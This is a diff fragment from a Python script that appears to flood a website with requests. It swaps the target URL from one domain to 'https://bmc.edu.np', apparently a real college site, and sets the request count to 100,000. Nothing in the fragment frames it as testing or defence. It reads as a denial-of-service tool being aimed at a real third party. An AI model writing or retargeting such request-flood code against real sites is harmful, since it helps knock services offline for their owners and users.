@@ -59,7 +59,7 @@ def send_request(url):
 
 def main():
     # Define the URL
-    url = 'https://sharemarketnepal.xyz'
+    url = 'https://bmc.edu.np'
     
     # Number of times to send the request
     num_requests = 100000
